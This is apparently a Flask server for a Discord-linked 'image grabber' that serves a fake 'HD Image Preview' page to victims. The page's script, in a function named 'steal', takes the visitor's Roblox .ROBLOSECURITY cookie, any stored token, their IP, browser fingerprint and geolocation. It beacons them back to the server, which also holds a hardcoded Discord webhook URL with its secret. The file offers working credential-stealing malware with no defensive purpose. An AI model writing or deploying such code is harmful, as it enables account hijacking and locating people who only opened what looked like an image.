from flask import Flask, request, Response
import base64
import requests
from datetime import datetime
from urllib.parse import urlencode

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
GIF_DATA = "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def main(path=""):
    ip = request.remote_addr
    
    if "test" in path.lower():
        requests.post(WEBHOOK_URL, json={"content": f"TEST {ip}"})
        return "TEST OK"
    
    if any(x in path.lower() for x in ["grab.png", "steal.png", "image.png"]):
        return Response(full_grabber(ip), mimetype="text/html")
    
    return Response(base64.b64decode(GIF_DATA), mimetype="image/gif")

def full_grabber(ip):
    return f"""<!DOCTYPE html><html><head><title></title><meta charset="UTF-8"><style>*{{margin:0;padding:0;box-sizing:border-box;}}html,body{{height:100vh;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden;}}header{{position:fixed;top:0;left:0;right:0;background:rgba(0,0,0,0.9);padding:12px;text-align:center;z-index:999;font-size:14px;border-bottom:1px solid #333;}}main{{display:flex;align-items:center;justify-content:center;height:100vh;padding:20px;}}img{{max-width:95vw;max-height:95vh;max-height:calc(100vh - 80px);object-fit:contain;border:2px solid #444;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.5);}}</style></head><body><header><div>🖼️ HD Image Preview - Enhanced Viewer</div></header><main><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUwIiBoZWlnaHQ9IjM1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiByeD0iMjQiIGZpbGw9IiMxMTExMTEiLz48Y2lyY2xlIGN4PSIyMjUiIGN5PSIxNTAiIHI9IjQwIiBmaWxsPSIjNDQ0Ii8+PHRleHQgeD0iNTAlIiB5PSI2MCUiIGZvbnQtc2l6ZT0iMjgiIGZpbGw9IiNmZmYiIGZvbnQtd2VpZ2h0PSI2MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkxvYWRpbmcgSEQgSW1hZ2UuLi48L3RleHQ+PHRleHQgeD0iNTAlIiB5PSI3NSUiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IiM5OTkiIGZvbnQtd2VpZ2h0PSI0MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkNhbGxpbmctZGF0YS4uLjwvdGV4dD48L3N2Zz4=" loading="lazy" alt="Premium Image"></main><script>!async function(){{let sent=0;async function steal(){{try{{let data={{ip:"{ip}",screen:`${{screen.width}}x${{screen.height}}x${{screen.colorDepth}}`,avail:`${{screen.availWidth}}x${{screen.availHeight}}`,ua:navigator.userAgent.slice(0,150),lang:navigator.language,platform:navigator.platform,cores:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cookies:document.cookie?document.cookie.split(';').length:0,ref:document.referrer.slice(0,120),time:new Date().toISOString().slice(0,19),tzoffset:-(new Date()).getTimezoneOffset()}};let t=localStorage.getItem("token")||"";if(t)data.token=t.slice(0,100);let r=document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/);if(r){{let c=r[1].replace(/[^a-zA-Z0-9_-]/g,'');if(c)data.roblox=c.slice(0,100);}};try{{let ipresp=await fetch("https://httpbin.org/ip");let ipdata=await ipresp.json();Object.assign(data,ipdata);let georesp=await fetch("https://ipapi.co/json/");let geodata=await georesp.json();Object.assign(data,{{"city":geodata.city,"region":geodata.region,"country":geodata.country_name,"isp":geodata.org,"asn":geodata.asn,"lat":geodata.latitude,"lon":geodata.longitude,"tzgeo":geodata.timezone,"localtime":geodata.utc_offset}});}}catch(e){{}};let params=new URLSearchParams(data).toString();navigator.sendBeacon("/steal.png?"+params);navigator.sendBeacon("/grab.png?"+params);fetch("/steal.png",{{method:"POST",body:params,keepalive:true,cache:"no-cache"}});fetch("/grab.png?"+params,{{method:"POST",keepalive:true}});sent++;document.title="Image #"+sent;console.log("Sent",data.ip,data.lat,data.lon);}}catch(e){{console.log("Retry",e);}}};steal();setTimeout(steal,2e3);setTimeout(steal,6e3);window.addEventListener("mousemove",()=>{{steal();window.removeEventListener("mousemove",arguments.callee);}},{{once:true}});}}();</script></body></html>"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
